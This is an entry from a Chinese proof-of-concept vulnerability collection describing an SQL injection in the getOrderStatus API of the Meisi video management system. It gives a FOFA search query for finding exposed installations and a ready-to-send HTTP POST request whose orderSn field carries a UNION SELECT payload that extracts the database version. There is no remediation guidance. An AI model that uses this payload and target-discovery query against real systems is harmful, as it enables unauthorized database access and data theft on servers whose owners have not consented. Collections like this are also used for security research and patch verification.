---

source: "wy876 漏洞文库"
---

# 魅思视频管理系统getOrderStatus存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(47, 48, 52);">魅思·视频 管理系统是一款集成了视频管理、用户管理、手机端应用封装等功能的综合性视频管理系统。该系统不仅以其强大的视频!理功能、灵活的用户管理机制、便捷的手机端应用封装功能以及高安全性和现代化的界面设计，成为了市场上备受关注的视频管理系统。无论是对于专业的视频内容创作者还是对于需要视频管理功能的企业和个人用户来说，都是一个值得考虑的选择。魅思视频管理系统getOrderStatus存在SQL注入漏洞</font>

# 二、影响版本
+ 魅思视频管理系统

# 三、资产测绘
+ fofa`app="魅思-视频管理系统"`
+ 特征


# 四、漏洞复现
```go
POST /api/getOrderStatus HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
orderSn=') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(IFNULL(CAST(VERSION() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL-- -
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kv3dxee1t0tqrohb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
